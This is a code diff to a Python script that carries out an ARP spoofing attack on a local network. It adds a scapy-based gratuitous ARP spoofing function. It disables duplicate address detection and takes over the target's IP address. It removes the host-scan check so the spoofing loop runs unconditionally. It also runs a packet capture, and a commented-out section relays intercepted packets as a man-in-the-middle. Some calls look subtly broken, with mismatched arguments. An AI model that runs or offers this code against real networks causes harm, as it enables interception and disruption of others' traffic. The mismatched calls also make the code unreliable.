@@ -165,6 +165,8 @@ class NetFunctions():
     def changeIPAddressLinux(interface, IP, Subnet):
         try:
             # Bring the interface down
+            subprocess.run(["sudo", "sysctl", "-w", f"net.ipv6.conf.{interface}.accept_dad=0"], check=True)
+
             subprocess.run(["sudo", "ip", "link", "set", "'"+interface+"'", "down"], check=True)
 
             # Set the new IP address
@@ -174,15 +176,17 @@ class NetFunctions():
             subprocess.run(["sudo", "ip", "link", "set", "'"+interface+"'", "up"], check=True)
         except subprocess.CalledProcessError as e:
             print(f"Failed to change IP address: {e}")
-    def changeIPAddressWindows(interface, IP, Subnet):
+
+    def changeIPAddressWindows(target, interface, IP, Subnet):
         try:
+            NetFunctions.send_gratuitous_arp(target, NetFunctions.get_mac_by_ip_SELF(IP), "255.255.255.0")
            # Set the new IP address
             cmd_ip = [
                 "netsh", "interface", "ip", "set", "address", f"'name={interface}'",
                 "source=static", f"addr={IP}", f"mask={Subnet}"
             ]
-            subprocess.run(cmd_ip, check=True, capture_output=True)
-            #os.system(f"netsh interface ip set address name='{interface}' source=static addr='{IP}' mask='{Subnet}'")
+            test = subprocess.run(cmd_ip, check=True, capture_output=True)
+            print(test)
         except subprocess.CalledProcessError as e:
             print(f"Failed to change IP address: {e}")
 
@@ -191,6 +195,19 @@ class NetFunctions():
             return NetFunctions.changeIPAddressWindows(interface, IP, Subnet)
         else:
             return NetFunctions.changeIPAddressLinux(interface, IP, Subnet)
+
+    def send_gratuitous_arp(target_ip: str, MAC: str, interface: str):
+        # Construct the ARP request
+        arp_packet = scapy.ARP(psrc=target_ip, pdst=target_ip, hwsrc=MAC, hwdst="ff:ff:ff:ff:ff:ff", op=2)
+    
+        # Broadcast Ethernet frame
+        ether_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    
+        # Combine Ethernet and ARP
+        packet = ether_packet / arp_packet
+
+        # Send the packet
+        scapy.sendp(packet, iface=interface)
 
 
 def Main():
@@ -220,63 +237,60 @@ def Main():
     t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
     t1.start()
 
-    try:
-       print("Starting Network Host Scan")
-       nm = nmap.PortScanner()
-       nm.scan(str(net.network_address) + "/24", '1')
-       print(nm.all_hosts())
-    except KeyboardInterrupt:
-       sys.exit()
-    except Exception as e: 
-       print(f"Network scan failed: {e}")
+    #try:
+    #    print("Starting Network Host Scan")
+    #    nm = nmap.PortScanner()
+    #    nm.scan(str(net.network_address) + "/24", '1')
+    #    print(nm.all_hosts())
+    #except KeyboardInterrupt:
+    #    sys.exit()
+    #except Exception as e: 
+    #    print(f"Network scan failed: {e}")
 
     print(f"Starting ARP attack against: {Target}")
     test=0
-    if Target in nm.all_hosts():
-        while 1:
-            try:
-                NetFunctions.spoof(Target, IP, TargetMac, Mac) #switches MAC addresses
+    #if Target in nm.all_hosts():
+    while 1:
+        try:
+            NetFunctions.spoof(Target, IP, TargetMac, Mac) #switches MAC addresses
 
-                if(test==0):
-                    # t2 = threading.Thread(target=NetFunctions.changeIPAddress, args=(Interface, Target, MASK))
-                    # t2.start()
-                    # t2.join()
-                    #NetFunctions.changeIPAddress(Interface, Target, MASK)
-                    test=1
+            if(test==0):
+                NetFunctions.changeIPAddress(Target, Interface, Target, MASK)
+                test=1
             
-                # packetCaptured = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=1) #Captures Packets
+            # packetCaptured = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=1) #Captures Packets
 
-                # if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
-                #     if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
-                #         packet = packetCaptured.copy()
+            # if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
+            #     if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
+            #         packet = packetCaptured.copy()
 
-                #         packet.pdst = Target
-                #         packet.dst = TargetMac
+            #         packet.pdst = Target
+            #         packet.dst = TargetMac
 
-                #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
-                #     if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
-                #         packet = packetCaptured.copy()
+            #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
+            #     if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
+            #         packet = packetCaptured.copy()
 
-                #         packet.pdst = IP
-                #         packet.dst = Mac
+            #         packet.pdst = IP
+            #         packet.dst = Mac
 
-                #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
+            #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
 
-            except KeyboardInterrupt: #closes on keyboard interupt
-                NetFunctions.restore(Target, IP)
-                t2 = threading.Thread(target=NetFunctions.changeIPAddress, args=(Interface, IP, MASK))
-                t2.start()
-                t2.join()
-                t1.join()
-                sys.exit()
-            except Exception as e: #closes on exception
-                print(f"Arp spoofing failed: {e}")
-                NetFunctions.restore(Target, IP)
-                t2 = threading.Thread(target=NetFunctions.changeIPAddress, args=(Interface, IP, MASK))
-                t2.start()
-                t2.join()
-                t1.join()
-                sys.exit()
+        except KeyboardInterrupt: #closes on keyboard interupt
+            NetFunctions.restore(Target, IP)
+            t2 = threading.Thread(target=NetFunctions.changeIPAddress, args=(Interface, IP, MASK))
+            t2.start()
+            t2.join()
+            t1.join()
+            sys.exit()
+        except Exception as e: #closes on exception
+            print(f"Arp spoofing failed: {e}")
+            NetFunctions.restore(Target, IP)
+            t2 = threading.Thread(target=NetFunctions.changeIPAddress, args=(Interface, IP, MASK))
+            t2.start()
+            t2.join()
+            t1.join()
+            sys.exit()
 
 Main()
 
